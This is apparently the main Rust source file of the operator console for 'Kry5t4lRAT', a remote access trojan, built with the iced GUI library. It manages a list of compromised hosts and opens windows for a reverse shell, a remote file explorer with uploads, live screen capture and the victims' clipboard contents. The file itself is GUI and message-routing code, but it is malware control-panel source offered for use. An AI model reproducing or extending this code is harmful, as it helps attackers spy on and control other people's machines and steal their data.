mod modules;
mod views;
use std::{collections::{BTreeMap}, sync::{Arc, Mutex}, time::Duration};

use iced::{window, Element, Font, Subscription, Task, Vector};

use views::Kry5t4lState;

use crate::views::{
    clipboard::{initialize_clipboard_channel, ClipboardUpdate, G_CLIPBOARD_MESSAGE_RECEIVER}, explorer::{initialize_explorer_channel, Explorer, ExplorerMessage, ExplorerUpdate, G_EXPLORER_MESSAGE_RECEIVER}, hosts::HostsMessage, monitor::{initialize_monitor_channel, MonitorMessage, MonitorUpdate, MonitorWindow, G_MONITOR_MESSAGE_RECEIVER}, shell::{initialize_shell_channel, RemoteShellMessage, RemoteShellWindow, ShellUpdate, G_SHELL_MESSAGE_RECEIVER}, Kry5t4lMessage
};

use once_cell::sync::Lazy;

static G_CONTROL_WINDOW_ID: Lazy<Arc<Mutex<Option<window::Id>>>> = 
    Lazy::new(|| Arc::new(Mutex::new(None)));

pub const CHINESE_FONT: Font = Font::with_name("Microsoft YaHei");
pub const EMOJI_FONT: Font = Font::with_name("Segoe UI Emoji");

fn main() -> iced::Result {

    iced::daemon(Example::title, Example::update, Example::view)
        .subscription(Example::subscription)
        .default_font(CHINESE_FONT)
        .run_with(Example::new)

}

struct Example {
    windows: BTreeMap<window::Id, WindowType>,
}

#[derive(Debug, Clone)]
enum WindowType {
    Control(Kry5t4lState),
    Shell(RemoteShellWindow),
    File(Explorer),
    Monitor(MonitorWindow),
}

#[derive(Debug, Clone)]
enum Message {
    // 窗口管理消息
    WindowOpened(window::Id, WindowType),
    WindowClosed(window::Id),

    // 控制面板消息
    ControlMsg(window::Id, Kry5t4lMessage),

    // Shell 窗口消息
    ShellMsg(window::Id, RemoteShellMessage),

    // Shell 全局更新
    ShellUpdate(ShellUpdate),
    CheckShellUpdates,

    // Explorer 窗口消息
    ExplorerMsg(window::Id, ExplorerMessage),

    // Explorer 全局更新
    ExplorerUpdate(ExplorerUpdate),
    CheckExplorerUpdates,

    // Monitor 窗口消息
    MonitorMsg(window::Id, MonitorMessage),

    // Monitor 全局更新
    MonitorUpdate(MonitorUpdate),
    CheckMonitorUpdates,
    ProcessAllMonitorFrames,

    // Clipboard 全局更新
    ClipboardUpdate(ClipboardUpdate),
    CheckClipboardUpdates,

    NoAction,
}

impl Example {
    fn new() -> (Self, Task<Message>) {
        let control_window = Kry5t4lState::new();
        let ico = iced::window::icon::from_file("./kry5t4l_server/assets/logo.ico").unwrap();
        let (control_id, open) = window::open(window::Settings {
            position: window::Position::Centered,
            icon: Some(ico),
            ..Default::default()
        });

        // 初始化消息通道
        initialize_shell_channel();
        initialize_explorer_channel();
        initialize_monitor_channel();
        initialize_clipboard_channel();

        *G_CONTROL_WINDOW_ID.lock().unwrap() = Some(control_id);

        (
            Self {
                windows: BTreeMap::new(),
            },
            open.map(move |id| Message::WindowOpened(id, WindowType::Control(control_window.clone())))
        )
    }
    
    fn title(&self, window: window::Id) -> String {
        self.windows.get(&window)
        .map(|window_type| match window_type {
            WindowType::Control(_) => "Kry5t4lRAT - Control".to_string(),
            WindowType::Shell(w) => w.title.clone(),
            WindowType::File(w) => w.title(),
            WindowType::Monitor(w) => w.title(),
        })
        .unwrap_or_default()
    }

    fn update(&mut self, message: Message) -> Task<Message> {
        match message {
            Message::WindowOpened(id, window_type) => {
                                self.windows.insert(id, window_type);
                                Task::none()
                            }
            Message::WindowClosed(id) => {
                                if *G_CONTROL_WINDOW_ID.lock().unwrap() == Some(id) {
                                    *G_CONTROL_WINDOW_ID.lock().unwrap() = None;
                                }

                                if let Some(WindowType::Shell(state)) = self.windows.get_mut(&id) {
                                    state.send_shell_command("exit");
                                }

                                self.windows.remove(&id);
                                
                                if self.windows.is_empty() {
                                    iced::exit()
                                } else {
                                    Task::none()
                                }
                            }
            Message::ControlMsg(id, kry_msg) => {
                                if let Some(WindowType::Control(state)) = self.windows.get_mut(&id) {
                                    let update_task = state.update(kry_msg.clone()).map(move |m| Message::ControlMsg(id, m));
                    
                                    match kry_msg {
                                        Kry5t4lMessage::HostsMessage(HostsMessage::ReverseShell) => {
                                            if let Some(host) = state.hosts_state.get_selected_host() {
                                                let window_type = WindowType::Shell(RemoteShellWindow::new(
                                                    host.clientid.clone(),
                                                    host.peer_addr,
                                                ));
                                                let open_task = self.open_new_window(window_type);
                                                return Task::batch(vec![update_task, open_task]);
                                            }
                                            update_task
                                        }
                                        Kry5t4lMessage::HostsMessage(HostsMessage::FileSystem) => {
                                            if let Some(host) = state.hosts_state.get_selected_host() {
                                                let window_type = WindowType::File(Explorer::new(
                                                    host.clientid.clone(), 
                                                    host.peer_addr
                                                ));
                                                let open_task = self.open_new_window(window_type);
                                                return Task::batch(vec![update_task, open_task]);
                                            }
                                            update_task
                                        }
                                        Kry5t4lMessage::HostsMessage(HostsMessage::Screenshot) => {
                                            if let Some(host) = state.hosts_state.get_selected_host() {
                                                let window_type = WindowType::Monitor(MonitorWindow::new(
                                                    host.clientid.clone(), 
                                                    host.peer_addr,
                                                ));
                                                let open_task = self.open_new_window(window_type);
                                                return Task::batch(vec![update_task, open_task]);
                                            }
                                            update_task
                                        }
                                        _ => update_task
                                    }
                                    
                                } else {
                                    Task::none()
                                }
                            }
            Message::ShellMsg(id, shell_msg) => {
                                if let Some(WindowType::Shell(window)) = self.windows.get_mut(&id) {
                                    window.update(shell_msg);
                                }
                                Task::none()
                            }
            Message::ExplorerMsg(id, explorer_msg) => {
                                if let Some(WindowType::File(window)) = self.windows.get_mut(&id) {
                                    window.update(explorer_msg);
                                }
                                Task::none()
                            }
            Message::MonitorMsg(id,monitor_msg ) => {
                                if let Some(WindowType::Monitor(window)) = self.windows.get_mut(&id) {
                                    window.update(monitor_msg);
                                }
                                Task::none()
                            }
            Message::ShellUpdate(update) => {
                                // 更新所有相关的Shell窗口
                                for window_type in self.windows.values_mut() {
                                    if let WindowType::Shell(shell) = window_type {
                                        match &update {
                                            ShellUpdate::SetPid { 
                                                client_id, 
                                                pid, 
                                                peer_addr 
                                            } => {
                                                println!("Checking shell window: client_id={}, shell.client_id={}, shell.pid={:?}", 
                                                 client_id, shell.client_id, shell.pid);
                                                    if shell.client_id == *client_id && shell.pid.is_none() {
                                                        shell.update(RemoteShellMessage::_ConnectionEstablished(*pid));
                                                    }
                                            }
                                            ShellUpdate::AppendOutput { 
                                                client_id, 
                                                pid, 
                                                output 
                                            } => {
                                                if shell.client_id == *client_id && shell.pid == Some(*pid) {
                                                    shell.update(RemoteShellMessage::_OutputReceived(output.clone()));
                                                }
                                            }
                                        }
                                    }
                                }
                                Task::none()
                            }
            Message::CheckShellUpdates => {
                                //println!("Message::CheckShellUpdates");
                                Task::perform(check_shell_updates(), |result| {
                                    if let Some(update) = result {
                                        Message::ShellUpdate(update)
                                    } else {
                                        Message::NoAction
                                    }
                                })
                            }
            Message::ExplorerUpdate(update) => {
                                // 更新所有相关的Explorer窗口
                                for window_type in self.windows.values_mut() {
                                    if let WindowType::File(explorer) = window_type {
                                        match &update {
                                            ExplorerUpdate::FileSystemInfo { 
                                                client_id, 
                                                json_data 
                                            } => {
                                                if explorer.client_id == *client_id {
                                                    explorer.update_from_json(json_data);
                                                }
                                            }
                                            ExplorerUpdate::UploadResult { 
                                                client_id, 
                                                src_path,
                                                success, 
                                                message 
                                            } => {
                                                if explorer.client_id == *client_id {
                                                    let _ = explorer.update(ExplorerMessage::UploadResult(
                                                        src_path.to_string(),
                                                        *success, 
                                                        message.clone()
                                                    ));
                                                }
                                            }
                                        }
                                    }
                                }
                                Task::none()
                            }
            Message::CheckExplorerUpdates => {
                            Task::perform(check_explorer_updates(), |result| {
                                if let Some(update) = result {
                                    Message::ExplorerUpdate(update)
                                } else {
                                    Message::NoAction
                                }
                            })
                        }
            Message::MonitorUpdate(update) => {
                            //println!("Main received monitor update");

                            for (window_id, window_type) in self.windows.iter_mut()  {
                                if let WindowType::Monitor(monitor) = window_type {
                                    match &update {
                                        MonitorUpdate::ScreenData { 
                                            client_id, 
                                            screen_data 
                                        } => {
                                            if monitor.client_id == *client_id {
                                                monitor.update_frame(screen_data.clone());
                                            }
                                        }
                                        MonitorUpdate::ScreenInfo { 
                                            client_id, 
                                            width, 
                                            height } => {
                                                if monitor.client_id == *client_id {
                                                    monitor.update_screen_info(*width, *height);

                                                    let scaled_width = (monitor.screen_width as f32 * monitor.window_scale) as f32 + 100.0;
                                                    let scaled_height = (monitor.screen_height as f32 * monitor.window_scale) as f32 + 150.0;

                                                    println!("调整Monitor窗口大小: {}x{}", scaled_width, scaled_height);

                                                    return window::resize(
                                                        *window_id, 
                                                        iced::Size::new(scaled_width, scaled_height)
                                                    );

                                                }
                                            }
                                    }
                                }
                            }
                            Task::none()
                        }
            Message::CheckMonitorUpdates => {
                            Task::perform(check_monitor_updates(), |result| {
                                if let Some(update) = result {
                                    Message::MonitorUpdate(update)
                                } else {
                                    Message::NoAction
                                }
                            })
                        }
            Message::ProcessAllMonitorFrames => {
                            for (window_id, window_type) in self.windows.iter_mut() {
                                if let WindowType::Monitor(monitor) = window_type {
                                    monitor.update(MonitorMessage::ProcessFrame);
                                }
                            }
                            Task::none()
                        }
            Message::ClipboardUpdate(update) => {
                            if let Some(control_id) = *G_CONTROL_WINDOW_ID.lock().unwrap() {
                                let msg = Kry5t4lMessage::HostsMessage(HostsMessage::ClipboardContentReceived(update.content));
                                return Task::done(Message::ControlMsg(control_id, msg));
                            }
                            Task::none()
                        }
            Message::CheckClipboardUpdates => {
                            Task::perform(check_clipboard_updates(), |result| {
                                if let Some(update) = result {
                                    Message::ClipboardUpdate(update)
                                } else {
                                    Message::NoAction
                                }
                            })
            }
            Message::NoAction => {
                            Task::none()
                        }
        }
    }

    fn open_new_window(&self, window_type: WindowType) -> Task<Message> {
        //println!("准备创建新窗口: {:?}", window_type);
        let window_type_clone = window_type.clone();
        let position = if let Some(last_window) = self.windows.keys().last() {
            let last_id = *last_window;
            window::get_position(last_id)
                .then(move |last_position| {
                    let position = last_position.map_or(
                        window::Position::Default,
                        |last_position| {
                            window::Position::Specific(
                                last_position + Vector::new(30.0, 30.0),
                            )
                        },
                    );
                    
                    let size = match &window_type {
                        WindowType::Shell(_) => iced::Size::new(800.0, 600.0),
                        WindowType::Control(_) => iced::Size::new(1000.0, 700.0),
                        WindowType::File(_) => iced::Size::new(1200.0, 800.0),
                        WindowType::Monitor(_) => iced::Size::new(800.0, 600.0),
                    };


                    let (_id, open) = window::open(window::Settings {
                        position,
                        size,
                        ..window::Settings::default()
                    });

                    open
                })
                .map(move |id| Message::WindowOpened(id, window_type_clone.clone()))
        } else {
            let (_id, open) = window::open(window::Settings::default());
            open.map(move |id| Message::WindowOpened(id, window_type.clone()))
        };

        position
    }

    fn view(&self, window_id: window::Id) -> Element<Message> {
        if let Some(window_type) = self.windows.get(&window_id) {
            match window_type {
                WindowType::Control(kry5t4l_state) => 
                    kry5t4l_state
                        .view()
                        .map(move |msg| Message::ControlMsg(window_id, msg)),
                WindowType::Shell(remote_shell_window) => 
                    remote_shell_window
                        .view(window_id)
                        .map(move |msg| Message::ShellMsg(window_id, msg)),
                WindowType::File(remote_explorer_window) => 
                    remote_explorer_window
                        .view(window_id)
                        .map(move |msg| Message::ExplorerMsg(window_id, msg)),
                WindowType::Monitor(remote_monitor_window) => 
                    remote_monitor_window
                        .view(window_id)
                        .map(move |msg| Message::MonitorMsg(window_id, msg))
            }
        } else {
            iced::widget::horizontal_space().into()
        }
    }
    
    fn subscription(&self) -> Subscription<Message> {
        let close = window::close_events().map(Message::WindowClosed);

        // 主机列表刷新（1秒）
        let hosts_refresh = iced::time::every(Duration::from_secs(1)).map(|_instant| {
            if let Some(control_id) = *G_CONTROL_WINDOW_ID.lock().unwrap() {
                Message::ControlMsg(
                    control_id,
                    Kry5t4lMessage::HostsMessage(HostsMessage::Refresh),
                )
            } else {
                Message::NoAction 
            }
        });

        // Shell 更新检查（100ms）
        let shell_updates = iced::time::every(Duration::from_millis(100)).map(|_instant| {
            Message::CheckShellUpdates 
        });

        // Explorer 更新检查（100ms）
        let explorer_updates = iced::time::every(Duration::from_millis(100)).map(|_instant| {
            Message::CheckExplorerUpdates 
        });

        // Clipboard 更新检查（100ms）
        let clipboard_updates = iced::time::every(Duration::from_millis(100)).map(|_instant| {
            Message::CheckClipboardUpdates 
        });

        // Monitor 网络更新检查（10ms）
        let monitor_updates = iced::time::every(Duration::from_millis(10)).map(|_instant| {
            Message::CheckMonitorUpdates
        });

        // Monitor 帧处理定时器（33ms）
        let monitor_process = iced::time::every(Duration::from_millis(33)).map(|_instant| {
            Message::ProcessAllMonitorFrames
        });


        Subscription::batch(vec![
            close, 
            hosts_refresh, 
            shell_updates, 
            explorer_updates,
            clipboard_updates,
            monitor_updates,
            monitor_process
            ])
    }
}

async fn check_shell_updates() -> Option<ShellUpdate> {
    if let Some(receiver) = G_SHELL_MESSAGE_RECEIVER.lock().unwrap().as_ref() {
        if let Ok(update) = receiver.try_recv() {
            return Some(update);
        }
    }
    None
}

async fn check_explorer_updates() -> Option<ExplorerUpdate> {
    if let Some(receiver) = G_EXPLORER_MESSAGE_RECEIVER.lock().unwrap().as_ref() {
        if let Ok(update) = receiver.try_recv() {
            return Some(update);
        }
    }
    None
}

async fn check_monitor_updates() -> Option<MonitorUpdate> {
    if let Some(receiver) = G_MONITOR_MESSAGE_RECEIVER.lock().unwrap().as_ref() {
        if let Ok(update) = receiver.try_recv() {
            return Some(update);
        }
    }
    None
}

async fn check_clipboard_updates() -> Option<ClipboardUpdate> {
    if let Some(receiver) = G_CLIPBOARD_MESSAGE_RECEIVER.lock().unwrap().as_ref() {
        if let Ok(update) = receiver.try_recv() {
            return Some(update);
        }
    }
    None
}